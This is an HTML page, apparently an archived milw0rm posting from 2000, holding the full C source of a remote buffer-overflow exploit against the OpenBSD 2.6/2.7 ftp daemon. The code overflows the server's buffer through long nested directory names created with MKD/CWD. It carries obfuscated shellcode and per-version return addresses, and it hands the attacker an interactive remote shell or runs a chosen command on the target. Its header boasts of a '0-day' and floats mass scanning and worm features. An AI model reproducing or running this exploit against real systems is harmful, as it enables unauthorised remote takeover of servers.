<html><head><title>OpenBSD 2.6 / 2.7ftpd Remote Exploit</title></head><pre>/*
   h0h0h0 0-day k0d3z
   Exploit by Scrippie, help by dvorak and jimjones

   greets to sk8

   Not fully developt exploit but it works most of the time ;)

   Things to add:
      - automatic writeable directory finding
      - syn-scan option to do mass-scanning
      - worm capabilities? (should be done seperatly using the -C option

   11/13/2000
*/

#include &lt;stdio.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;


void usage(char *program);
char *strcreat(char *, char *, int);
char *longToChar(unsigned long);
char *xrealloc(void *, size_t);
void xfree(char **ptr);
char *xmalloc(size_t);
int xconnect(char *host, u_short port);
void xsend(int fd, char *buf);
void xsendftpcmd(int fd, char *command, char *param);
void xrecieveall(int fd, char *buf, int size);
void xrecieve(int fd, char *buf, int size);
void ftp_login(int fd, char *user, char *password);
void exploit(int fd);

int verbose = 0;


/*
   Written by dvorak, garbled up by &quot;Smegma&quot; with a word xor 0xaabb mask
   to get rid of dots and slashes.
*/

char heavenlycode[] =
&quot;\x31\xc0\x89\xc1\x80\xc1\x02\x51\x50\x04\x5a\x50\xcd\x80&quot;
&quot;\xeb\x10\x5e\x31\xc9\xb1\x4a\x66\x81\x36\xbb\xaa\x46\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xff\xff\xff\x50\xcf\xe5\x9b\x7b\xf
a\xbf\xbd\xeb\x67\x3b\xfc\x8a\x6a\x33\xec\xba\xae\x33\xfa\x76\x2a\x8a\x6a\xeb\x22\xfd\xb5\x36\xf4\xa5\xf9\xbf\xaf\xeb\x67\x3b\x2
3\x7a\xfc\x8a\x6a\xbf\x97\xeb\x67\x3b\xfb\x8a\x6a\xbf\xa4\xf3\xfa\x76\x2a\x36\xf4\xb9\xf9\x8a\x6a\xbf\xa6\xeb\x67\x3b\x27\xe5\xb
4\xe8\x9b\x7b\xae\x86\xfa\x76\x2a\x8a\x6a\xeb\x22\xfd\x8d\x36\xf4\x93\xf9\x36\xf4\x9b\x23\xe5\x82\x32\xec\x97\xf9\xbf\x91\xeb\x6
7\x3b\x42\x2d\x55\x44\x55\xfa\xeb\x95\x84\x94\x84\x95\x85\x95\x84\x94\x84\x95\x85\x95\x84\x94\x84\x95\x85\x95\x84\x94\x84\x95\x8
5\x95\x84\x94\x84\x95\xeb\x94\xc8\xd2\xc4\x94\xd9\xd3&quot;;

char user[255] = &quot;anonymous&quot;;
char pass[255] = &quot;anonymous@abc.com&quot;;
char write_dir[PATH_MAX] = &quot;/&quot;;
int ftpport = 21;
unsigned long int ret_addr = 0;
#define CMD_LOCAL 0
#define CMD_REMOTE 1
int command_type = -1;
char *command = NULL;

struct typeT {
        char *name;
        unsigned long int ret_addr;
};

#define NUM_TYPES 2
struct typeT types[NUM_TYPES] = {
        &quot;OpenBSD 2.6&quot;, 0xdfbfd0ac,
        &quot;OpenBSD 2.7&quot;, 0xdfbfd0ac};

void
usage(char *program)
{
        int i;
        fprintf(stderr,
                &quot;\nUsage: %s [-h host] [-f port] [-u user] [-p pass] [-d directory] [-t type]\n\t\t[-r retaddr] [-c command] 
[-C command]\n\n&quot;
                &quot;Directory should be an absolute path, writable by the user.\n&quot;
                &quot;The argument of -c will be executed on the remote host\n&quot;
                &quot;while the argument of -C will be executed on the local\n&quot;
                &quot;with its filedescriptors connected to the remote host\n&quot;
                &quot;Valid types:\n&quot;,
                program);
        for (i = 0; i &lt; NUM_TYPES; i++) {
                printf(&quot;%d : %s\n&quot;, i,  types[i].name);
        }
        exit(-1);
}


main(int argc, char **argv)
{
        unsigned int i;
        int opt, fd;
        unsigned int type = 0;
        char *hostname = &quot;localhost&quot;;

        if (argc &lt; 2)
                usage(argv[0]);

        while ((opt = getopt(argc, argv, &quot;h:r:u:f:d:t:vp:c:C:&quot;)) != -1) {
                switch (opt) {
                case 'h':
                        hostname = optarg;
                        break;
                case 'C':
                        command = optarg;
                        command_type = CMD_LOCAL;
                        break;
                case 'c':
                        command = optarg;
                        command_type = CMD_REMOTE;
                        break;
                case 'r':
                        ret_addr = strtoul(optarg, NULL, 0);
                        break;
                case 'v':
                        verbose++;
                        break;
                case 'f':
                        if (!(ftpport = atoi(optarg))) {
                                fprintf(stderr, &quot;Invalid destination port - %s\n&quot;, optarg);
                                exit(-1);
                        }
                        exit(-1);
                        break;
                case 'u':
                        strncpy(user, optarg, sizeof(user) - 1);
                        user[sizeof(user) - 1] = 0x00;
                        break;
                case 'p':
                        strncpy(pass, optarg, sizeof(pass) - 1);
                        pass[sizeof(pass) - 1] = 0x00;
                        break;
                case 'd':
                        strncpy(write_dir, optarg, sizeof(write_dir) - 1);
                        write_dir[sizeof(write_dir) - 1] = 0x00;
                        if ((write_dir[0] != '/')) 
                                usage(argv[0]);
                        if ((write_dir[strlen(write_dir) - 1] != '/'))
                                strncat(write_dir, &quot;/&quot;, sizeof(write_dir) - 1);
                        break;
                case 't':
                        type = atoi(optarg);
                        if (type &gt; NUM_TYPES)
                                usage(argv[0]);
                        break;
                default:
                        usage(argv[0]);
                }
        }

        if (ret_addr == 0)
                ret_addr = types[type].ret_addr;
        if ((fd = xconnect(hostname, ftpport)) == -1)
                exit(-1);
        else
                printf(&quot;Connected to remote host! Sending evil codes.\n&quot;);


        ftp_login(fd, user, pass);
        exploit(fd);


}

int
ftp_cmd_err(int fd, char *command, char *param, char *res, int size, char * msg)
{
        xsendftpcmd(fd, command, param);
        xrecieveall(fd, res, size);

        if (res == NULL)
                return 0;
        if (verbose)
                printf(&quot;%s\n&quot;, res);
        if (msg &amp;&amp; (res[0] != '2')) {
                fprintf(stderr, &quot;%s\n&quot;, msg);
                exit(-1);
        }
        return (res[0] != '2');
}

void shell(int fd)
{
        fd_set readfds;
        char buf[1];
        char *tst = &quot;echo ; echo ; echo HAVE FUN ; id ; uname -a\n&quot;;

        write(fd, tst, strlen(tst));
        while (1) {
                FD_ZERO(&amp;readfds);
                FD_SET(0, &amp;readfds);
                FD_SET(fd, &amp;readfds);
                select(fd + 1, &amp;readfds, NULL, NULL, NULL);
                if (FD_ISSET(0, &amp;readfds)) {
                        if (read(0, buf, 1) != 1) {
                                perror(&quot;read&quot;);
                                exit(1);
                        }
                        write(fd, buf, 1);
                }
                if (FD_ISSET(fd, &amp;readfds)) {
                        if (read(fd, buf, 1) != 1) {
                                perror(&quot;read&quot;);
                                exit(1);
                        }
                        write(1, buf, 1);
                }
        }
}

void do_command(int fd)
{
        char buffer[1024];
        int len;

        if (command_type == CMD_LOCAL) {
                dup2(fd, 0);
                dup2(fd, 1);
                dup2(fd, 2);
                execl(command, command, NULL);
                exit (2);
        }
        write(fd, command, strlen(command));
        write(fd, &quot;\n&quot;, 1);
        while ((len = read(fd, buffer, sizeof(buffer))) &gt; 0) {
                write(1, buffer, len);
        }
        exit (0);
}

void execute_command(fd) 
{
}

int exploit_ok(int fd)
{
        char result[1024];
        xsend(fd, &quot;id\n&quot;);

        xrecieve(fd, result, sizeof(result));
        return (strstr(result, &quot;uid=&quot;) != NULL);
}

void exploit(int fd)
{
        char res[1024];
        int heavenlycode_s;
        char *dir = NULL;

        ftp_cmd_err(fd, &quot;CWD&quot;, write_dir, res, 1024, &quot;Can't CWD to write_dir&quot;);

        dir = strcreat(dir, &quot;A&quot;, 255 - strlen(write_dir));
        ftp_cmd_err(fd, &quot;MKD&quot;, dir, res, 1024, NULL);
        ftp_cmd_err(fd, &quot;CWD&quot;, dir, res, 1024, &quot;Can't change to directory&quot;);
        xfree(&amp;dir);

        /* next on = 256 */

        dir = strcreat(dir, &quot;A&quot;, 255);
        ftp_cmd_err(fd, &quot;MKD&quot;, dir, res, 1024, NULL);
        ftp_cmd_err(fd, &quot;CWD&quot;, dir, res, 1024, &quot;Can't change to directory&quot;);
        xfree(&amp;dir);
        /* next on = 512 */

        heavenlycode_s = strlen(heavenlycode);
        dir = strcreat(dir, &quot;A&quot;, 254 - heavenlycode_s);
        dir = strcreat(dir, heavenlycode, 1);
        ftp_cmd_err(fd, &quot;MKD&quot;, dir, res, 1024, NULL);
        ftp_cmd_err(fd, &quot;CWD&quot;, dir, res, 1024, &quot;Can't change to directory&quot;);
        xfree(&amp;dir);
        /* next on = 768 */

        dir = strcreat(dir, longToChar(ret_addr), 252 / 4);
        ftp_cmd_err(fd, &quot;MKD&quot;, dir, res, 1024, NULL);
        ftp_cmd_err(fd, &quot;CWD&quot;, dir, res, 1024, &quot;Can't change to directory&quot;);
        xfree(&amp;dir);
        /* length = 1020 */

        /* 1022 moet &quot; zijn */
        dir = strcreat(dir, &quot;AAA\&quot;&quot;, 1);
        ftp_cmd_err(fd, &quot;MKD&quot;, dir, res, 1024, NULL);
        ftp_cmd_err(fd, &quot;CWD&quot;, dir, res, 1024, &quot;Can't change to directory&quot;);
        xfree(&amp;dir);

        /* and tell it to blow up */
        ftp_cmd_err(fd, &quot;PWD&quot;, NULL, res, 1024, NULL);

        if (!exploit_ok(fd)) {
                if (command != NULL) {
                        exit (2);
                } 
                fprintf(stderr, &quot;Exploit failed\n&quot;);
                exit (1);
        }
        if (command == NULL)
                shell(fd);
        else
                do_command(fd);
}


char *
strcreat(char *dest, char *pattern, int repeat)
{
        char *ret;
        size_t plen, dlen = 0;
        int i;

        if (dest)
                dlen = strlen(dest);
        plen = strlen(pattern);

        ret = (char *) xrealloc(dest, dlen + repeat * plen + 1);

        if (!dest)
                ret[0] = 0x00;

        for (i = 0; i &lt; repeat; i++) {
                strcat(ret, pattern);
        }
        return (ret);
}

char *
longToChar(unsigned long blaat)
{
        char *ret;

        ret = (char *) xmalloc(sizeof(long) + 1);
        memcpy(ret, &amp;blaat, sizeof(long));
        ret[sizeof(long)] = 0x00;

        return (ret);
}

char *
xrealloc(void *ptr, size_t size)
{
        char *wittgenstein_was_a_drunken_swine;

        if (!(wittgenstein_was_a_drunken_swine = (char *) realloc(ptr, size))) {
                fprintf(stderr, &quot;Cannot calculate universe\n&quot;);
                exit(-1);
        }
        return (wittgenstein_was_a_drunken_swine);
}

void
xfree(char **ptr)
{
        if (!ptr || !*ptr)
                return;
        free(*ptr);
        *ptr = NULL;
}

char *
xmalloc(size_t size)
{
        char *heidegger_was_a_boozy_beggar;

        if (!(heidegger_was_a_boozy_beggar = (char *) malloc(size))) {
                fprintf(stderr, &quot;Out of cheese error\n&quot;);
                exit(-1);
        }
        return (heidegger_was_a_boozy_beggar);
}


int
xconnect(char *host, u_short port)
{
        struct hostent *he;
        struct sockaddr_in s_in;
        int fd;

        if ((he = gethostbyname(host)) == NULL) {
                perror(&quot;gethostbyname&quot;);
                return (-1);
        }
        memset(&amp;s_in, 0, sizeof(s_in));
        s_in.sin_family = AF_INET;
        s_in.sin_port = htons(port);
        memcpy(&amp;s_in.sin_addr.s_addr, he-&gt;h_addr, he-&gt;h_length);

        if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
                perror(&quot;socket&quot;);
                return (-1);
        }
        if (connect(fd, (const struct sockaddr *) &amp; s_in, sizeof(s_in)) == -1) {
                perror(&quot;connect&quot;);
                return (-1);
        }
        return fd;
}

/* returns status from ftpd */
void
ftp_login(int fd, char *user, char *password)
{
        char reply[512];
        int rep;
        xrecieveall(fd, reply, sizeof(reply));
        if (verbose) {
                printf(&quot;Logging in ..\n&quot;);
                printf(&quot;%s\n&quot;, reply);
        }
        xsendftpcmd(fd, &quot;USER&quot;, user);
        xrecieveall(fd, reply, sizeof(reply));
        if (verbose)
                printf(&quot;%s\n&quot;, reply);
        xsendftpcmd(fd, &quot;PASS&quot;, password);
        xrecieveall(fd, reply, sizeof(reply));
        if (verbose)
                printf(&quot;%s\n&quot;, reply);

        if (reply[0] != '2') {
                printf(&quot;Login failed.\n&quot;);
                exit(-1);
        }
}

void
xsendftpcmd(int fd, char *command, char *param)
{
        xsend(fd, command);

        if (param != NULL) {
                xsend(fd, &quot; &quot;);
                xsend(fd, param);
        }
        xsend(fd, &quot;\r\n&quot;);
}


void
xsend(int fd, char *buf)
{

        if (send(fd, buf, strlen(buf), 0) != strlen(buf)) {
                perror(&quot;send&quot;);
                exit(-1);
        }
}

void
xrecieveall(int fd, char *buf, int size)
{
        char scratch[6];

        if (buf == NULL || size == 0) {
                buf = scratch;
                size = sizeof(scratch);
        }
        memset(buf, 0, size);
        do {
                xrecieve(fd, buf, size);
        } while (buf[3] == '-');
}
/* recieves a line from the ftpd */
void
xrecieve(int fd, char *buf, int size)
{
        char *end;
        char ch;

        end = buf + size;

        while (buf &lt; end) {
                if (read(fd, buf, 1) != 1) {
                        perror(&quot;read&quot;); /* XXX */
                        exit(-1);
                }
                if (buf[0] == '\n') {
                        buf[0] = '\0';
                        return;
                }
                if (buf[0] != '\r') {
                        buf++;
                }
        }
        buf--;
        while (read(fd, buf, 1) == 1) {
                if (buf[0] == '\n') {
                        buf[0] = '\0';
                        return;
                }
        }
        perror(&quot;read&quot;);         /* XXX */
        exit(-1);
}


// milw0rm.com [2000-12-20]</pre></html>